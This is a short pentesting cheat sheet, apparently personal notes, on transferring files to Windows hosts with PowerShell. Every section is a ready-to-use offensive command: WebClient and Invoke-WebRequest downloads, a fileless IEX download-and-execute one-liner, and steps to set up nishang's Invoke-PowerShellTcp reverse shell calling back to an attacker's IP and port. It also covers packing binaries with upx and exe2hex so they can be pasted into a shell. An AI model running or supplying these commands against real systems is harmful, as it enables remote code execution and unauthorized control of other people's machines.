# Downloading files using Powershell

```bash
# If this doesn't work, try changing quotes:
powershell -c "(new-object System.Net.WebClient).DownloadFile('$URLOFTHEFILE','$DESTINATIONPATH')"
```

_____

```bash
# If this doesn't work, try changing quotes:
powershell.exe (New-Object System.Net.WebClient).DownloadFile('$URLOFFILE', '$NEWFILENAME')
```
_____

```bash
powershell
Invoke-WebRequest http://XX:XX/XX -OutFile C:\\temp\\XX
```

_____

If we want to download and execute the same file but not saving it to the disk, use:

```bash
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('$URLOFFILE')
```

_____

**Note**: If needed to execute a reverse shell we can use the nishang's reverse powershell as the file to server above:

```bash
#File:
/opt/nishang/Shells/Invoke-PowerShellTcp.ps1

nano Invoke-PowerShellTcp.ps1

#Add the following line at the end of the file:
Invoke-PowerShellTcp -Reverse -IPAddress $IPADDRESS -Port $PORT

#Setup a netcat listener and use the one-liner to execute the reverse shell:
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://xx:xx/Invoke-PowerShellTcp.ps1')
```

## Using exe2hex & powershell

First of all, optimize the file we want to transfer by using upx:

```bash
upx -9 $FILE
```

Now use exe2hex to convert the file:

```bash
exe2hex -x $FILE -p $RESULTFILENAME.cmd
#This creates a script with .cmd extension
```

Now we only need to copy and paste the script into a Windows shell.
